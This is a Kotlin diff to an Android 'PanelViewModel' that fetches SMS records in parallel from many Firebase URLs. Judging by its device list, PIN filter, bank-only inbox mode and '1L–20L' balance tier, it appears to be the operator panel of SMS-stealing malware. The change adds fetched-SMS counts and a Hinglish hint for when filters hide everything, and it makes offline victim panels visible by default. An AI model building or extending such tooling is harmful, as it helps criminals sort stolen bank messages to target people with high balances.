@@ -99,6 +99,10 @@ data class UiState(
     val fetching: Boolean = false,
     val progress: String = "",
     val lastFetchEpochMs: Long = 0L,
+    /** Total SMS rows last fetch (before filters). */
+    val lastFetchTotalSms: Int = 0,
+    /** When filters hide everything but SMS loaded — short hint for user. */
+    val filterEmptyHint: String? = null,
     val autoLiveRefresh: Boolean = false,
     val devices: List<DeviceRow> = emptyList(),
     val selected: DeviceDetail? = null,
@@ -109,7 +113,8 @@ data class UiState(
         FilterConfig(
             sortMode = SortMode.HIGH_TO_LOW,
             pinFilter = PinFilter.BOTH,
-            connection = ConnectionFilter.ONLINE,
+            /** Both = show panels even when HTTP reports offline (many DBs still have SMS). */
+            connection = ConnectionFilter.BOTH,
             days = null,
             inboxMode = InboxMode.BANK_FILTERED,
             balanceTier = BalanceTier.HIGH_1L_20L,
@@ -178,6 +183,8 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                         liveFeedSms = emptyList(),
                         selected = null,
                         lastFetchEpochMs = 0L,
+                        lastFetchTotalSms = 0,
+                        filterEmptyHint = null,
                         error = null,
                     )
                 }
@@ -202,16 +209,25 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                 devices = emptyList(),
                 liveFeedSms = emptyList(),
                 selected = null,
+                filterEmptyHint = null,
                 error = null,
             )
         }
         val results = fetchManyParallel(urls, concurrency = 12)
         lastResults = results
+        val totalSms = results.sumOf { it.sms.size }
+        val panelsHit = results.count { it.sms.isNotEmpty() }
         _state.update {
             it.copy(
                 fetching = false,
-                progress = "Done ${results.count { r -> r.online }} online / ${results.size} URLs",
+                progress =
+                    buildString {
+                        append("Done ${results.count { r -> r.online }} online / ${results.size} URLs")
+                        append(" · $totalSms SMS")
+                        if (panelsHit < results.size) append(" ($panelsHit panels me data)")
+                    },
                 lastFetchEpochMs = System.currentTimeMillis(),
+                lastFetchTotalSms = totalSms,
             )
         }
         applyFilters()
@@ -222,7 +238,17 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
         val q = _state.value.searchQuery.trim().lowercase()
         val devices = buildDeviceList(lastResults, cfg, q)
         val liveFeed = buildLiveFeedList(lastResults, cfg, q)
-        _state.update { it.copy(devices = devices, liveFeedSms = liveFeed, selected = null) }
+        val totalSms = lastResults.sumOf { it.sms.size }
+        val hint =
+            if (totalSms > 0 && devices.isEmpty() && liveFeed.isEmpty() && q.isEmpty()) {
+                "Firebase se $totalSms SMS aaye, lekin filters sab hide kar rahe — " +
+                    "Connection → Both, Mode → Full inbox, ya SMS age → All try karo."
+            } else {
+                null
+            }
+        _state.update {
+            it.copy(devices = devices, liveFeedSms = liveFeed, selected = null, filterEmptyHint = hint)
+        }
     }
 
     fun selectDevice(row: DeviceRow) {
